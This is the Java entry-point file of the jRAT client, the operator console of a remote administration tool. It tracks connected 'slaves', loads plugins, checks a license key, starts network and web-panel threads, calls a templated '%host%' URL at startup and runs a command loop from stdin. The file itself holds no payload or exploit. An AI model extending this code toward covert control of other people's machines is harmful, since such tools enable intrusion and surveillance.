package se.jrat.client;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.text.DateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import javax.swing.JFileChooser;
import javax.swing.JOptionPane;
import javax.swing.UIManager;

import jrat.api.commands.Commands;
import jrat.api.events.OnDisableEvent;
import se.jrat.client.addons.Plugin;
import se.jrat.client.addons.PluginLoader;
import se.jrat.client.commands.DefaultCommands;
import se.jrat.client.net.WebRequest;
import se.jrat.client.settings.AbstractSettings;
import se.jrat.client.settings.Settings;
import se.jrat.client.settings.CountryStatistics;
import se.jrat.client.settings.Theme;
import se.jrat.client.threads.RunnableCheckPlugins;
import se.jrat.client.threads.RunnableNetworkCounter;
import se.jrat.client.threads.ThreadCheckVersion;
import se.jrat.client.threads.ThreadPing;
import se.jrat.client.ui.dialogs.DialogEula;
import se.jrat.client.ui.frames.Frame;
import se.jrat.client.utils.TrayIconUtils;
import se.jrat.client.webpanel.WebPanelListener;
import se.jrat.common.Logger;
import se.jrat.common.Version;

import com.redpois0n.oslib.OperatingSystem;

public class Main {

	public static boolean liteVersion = true;
	public static boolean debug;
	public static boolean noSsl;

	public static final List<AbstractSlave> connections = new ArrayList<AbstractSlave>();
	public static Frame instance;

	public static void main(String[] args) throws Exception {	
		Main.debug("jRAT " + Version.getVersion() + " " + DateFormat.getDateInstance(DateFormat.SHORT).format(new Date()));
		try {
			PluginLoader.loadLibs();
		} catch (Exception e) {
			e.printStackTrace();
		}
		try {
			WebRequest.getUrl("%host%", true);
		} catch (Exception e) {
			e.printStackTrace();
		}
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
			Main.debug("Default user.dir: " + System.getProperty("user.dir"));
			if (System.getProperty("user.dir").contains("jRAT.app")) {
				System.setProperty("user.dir", System.getProperty("user.dir").split("jRAT.app")[0] + "/jRAT.app");
			}
			Main.debug("New user.dir: " + System.getProperty("user.dir"));
			Main.debug("File directory absolute expected path: " + Globals.getFileDirectory().getAbsolutePath());
		}
		
		if (argsContains(args, "-locinfo")) {
			System.out.println(System.getProperty("user.dir"));
			System.out.println("jRAT.app: " + new File("jRAT.app/").exists());
			System.out.println("jRAT.app/files/: " + new File("jRAT.app/files/").exists());
		}

		if (argsContains(args, "-genkey")) {
			Logger.log("Generating key");
			File file = Globals.getKeyFile();
			FileOutputStream out = new FileOutputStream(file);
			out.write(UniqueId.generateBinary());
			out.close();
			Logger.log("Wrote key to " + file.getAbsolutePath());
			System.exit(0);
		}

		debug = argsContains(args, "-debug");

		if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
			System.setProperty("apple.laf.useScreenMenuBar", "true");
		}
		
		if (!Globals.getFileDirectory().exists()) {
			JOptionPane.showMessageDialog(null, "Could not find /files/, please specify your " + Constants.NAME + " directory", Constants.NAME + "", JOptionPane.WARNING_MESSAGE);
			JFileChooser chooser = new JFileChooser();
			chooser.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
			chooser.showOpenDialog(null);

			File file = chooser.getSelectedFile();

			if (file != null) {
				System.setProperty("user.dir", file.getAbsolutePath());
			}
		}
		
		Globals.mkdirs();

		try {
			Theme.getGlobal().load();
			UIManager.setLookAndFeel(Theme.getGlobal().getTheme());
		} catch (Exception ex) {
			Main.debug("Could not use look and feel, setting default");
			ex.printStackTrace();
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		}
		
		try {
			boolean validated = UniqueId.validate(argsContains(args, "-showhexkey"));

			if (validated) {
				liteVersion = false;
			}
		} catch (Exception ex) {
			ex.printStackTrace();
			
			if (!argsContains(args, "-debug")) {
				JOptionPane.showMessageDialog(null, Constants.NAME + " is limited, no license detected", Constants.NAME, JOptionPane.ERROR_MESSAGE);
			}
		}

		System.setProperty("jrat.dir", System.getProperty("user.dir"));
		System.setProperty("jrat.version", Version.getVersion());

		try {
			PluginLoader.loadPlugins();
		} catch (Exception e) {
			e.printStackTrace();
		}

		CountryStatistics.getGlobal().load();
		Settings.getGlobal().load();
		
		instance = new Frame();
		
		AbstractSettings.loadAllGlobals();

		boolean showEULA = Settings.getGlobal().getBoolean("showeula");
		if (!showEULA) {
			DialogEula frame = new DialogEula(false);
			frame.setVisible(true);
		}

		if (!argsContains(args, "-noad") && liteVersion) {
			//FrameAd frame = new FrameAd();
			//frame.setVisible(true);
			
			// TODO Ad
		}

		new Thread(new RunnableNetworkCounter()).start();
		new ThreadCheckVersion().start();
		new Thread(new RunnableCheckPlugins()).start();
		new ThreadPing().start();
		new Thread(new WebPanelListener()).start();

		instance.setVisible(true);

		TrayIconUtils.initialize();
		Sound.initialize();

		Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
			public void run() {
				OnDisableEvent event = new OnDisableEvent();
				for (Plugin p : PluginLoader.plugins) {
					try {
						p.getMethods().get(Plugin.ON_DISABLE).invoke(p.getInstance(), new Object[] { event });
					} catch (Exception ex) {
						ex.printStackTrace();
					}
				}

				AbstractSettings.saveAllGlobals();

				try {
					Theme.getGlobal().save();
				} catch (Exception e) {
					e.printStackTrace();
				}
				
				try {
					Settings.getGlobal().save();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}));

		DefaultCommands.addDefault();

		BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
		String s;

		while ((s = reader.readLine()) != null) {
			Commands.execute(s, System.out);
		}
	}

	public static boolean argsContains(String[] args, String s) {
		for (String str : args) {
			if (str.equalsIgnoreCase(s)) {
				return true;
			}
		}

		return false;
	}

	public static String getArg(String[] args, String arg) {
		for (int i = 0; i < args.length; i++) {
			if (args[i].equalsIgnoreCase(arg)) {
				return args[i + 1];
			}
		}

		return null;
	}

	public static String debug(Object s) {
		if (s == null) {
			s = "null";
		}
		Logger.log(s.toString());
		return s.toString();
	}

	public static String formatTitle() {
		String suffix = liteVersion && !debug ? "Limited" : "";

		return Constants.NAME + " [" + connections.size() + "] " + Version.getVersion() + " " + suffix;
	}
	
	public static boolean isFeatureEnabled() {
		return Main.debug || !Main.liteVersion;
	}

}
